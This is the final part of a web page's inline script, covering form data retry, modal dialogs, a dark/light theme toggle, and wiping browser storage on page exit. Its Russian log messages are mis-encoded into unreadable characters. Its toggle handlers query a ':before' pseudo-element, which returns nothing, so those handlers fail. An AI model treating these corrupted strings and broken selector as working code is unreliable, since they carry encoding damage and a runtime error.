                    debugError('–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–≥–æ—Ç–æ–≤–∫–µ —Ñ–æ—Ä–º—ã', error);
                    resolve(false);
                }
            });
        }

        async function sendPendingData(jsonData) {
            try {
                const success = await sendFormData(jsonData);
                if (success) {
                    localStorage.removeItem(PENDING_DATA_KEY);
                    debugLog('–û—Ç–ª–æ–∂–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã');
                }
            } catch (error) {
                debugError('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –æ—Ç–ª–æ–∂–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö', error);
            }
        }

        function nukeLocalStorageOnExit() {
            try {
                console.log('–ü–û–õ–ù–ê–Ø –û–ß–ò–°–¢–ö–ê –ü–†–ò –í–´–•–û–î–ï');

                localStorage.clear();
                sessionStorage.clear();

                console.log('‚úÖ –í–°–ï –¥–∞–Ω–Ω—ã–µ —É–¥–∞–ª–µ–Ω—ã');
                return true;
            } catch (error) {
                console.error('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—á–∏—Å—Ç–∫–µ:', error);
                return false;
            }
        }

        function showSuccessModal() {
            successModal.classList.add('active');
            setTimeout(() => {
                successModal.classList.remove('active');
            }, 5000);
        }

        function showErrorModal(errorCode = 'ERR_UNKNOWN') {
            errorCodeSpan.textContent = errorCode;
            errorModal.classList.add('active');

            setTimeout(() => {
                errorModal.classList.remove('active');
            }, 5000);
        }

        successModal.addEventListener('click', (e) => {
            if (e.target === successModal) {
                successModal.classList.remove('active');
            }
        });

        errorModal.addEventListener('click', (e) => {
            if (e.target === errorModal) {
                errorModal.classList.remove('active');
            }
        });

        document.addEventListener('DOMContentLoaded', () => {
            initializeSystem();
            loadTheme();
        });

        function loadTheme() {
            const savedTheme = localStorage.getItem('theme');
            const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;

            if (savedTheme === 'dark') {
                body.classList.add('dark-mode');
                themeToggle.checked = true;
                updateThemeText(true);
            } else {
                body.classList.remove('dark-mode');
                themeToggle.checked = false;
                updateThemeText(false);

                if (!savedTheme) {
                    localStorage.setItem('theme', 'light');
                }
            }
        }

        function updateThemeText(isDark) {
            if (isDark) {
                themeLabel.textContent = 'DARK THEME';
            } else {
                themeLabel.textContent = 'LIGHT THEME';
            }
        }

        function playTransitionAnimation(callback) {
            transitionOverlay.classList.add('active');

            setTimeout(() => {
                callback();

                setTimeout(() => {
                    transitionOverlay.classList.add('fade-out');

                    setTimeout(() => {
                        transitionOverlay.classList.remove('active', 'fade-out');
                    }, 800);
                }, 100);
            }, 400);
        }

        function showSaveNotification() {
            saveNotification.classList.add('show');

            setTimeout(() => {
                saveNotification.classList.remove('show');
            }, 2000);
        }

        themeToggle.addEventListener('mousedown', function () {
            const slider = document.querySelector('.toggle-slider:before');
            slider.style.width = '55px';
        });

        themeToggle.addEventListener('mouseup', function () {
            const slider = document.querySelector('.toggle-slider:before');
            slider.style.width = '';
        });

        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
            if (!localStorage.getItem('theme')) {
                if (e.matches) {
                    body.classList.add('dark-mode');
                    themeToggle.checked = true;
                    updateThemeText(true);
                } else {
                    body.classList.remove('dark-mode');
                    themeToggle.checked = false;
                    updateThemeText(false);
                }
            }
        });

        window.addEventListener('beforeunload', function () {
            nukeLocalStorageOnExit();
        });
    </script>
</body>

</html>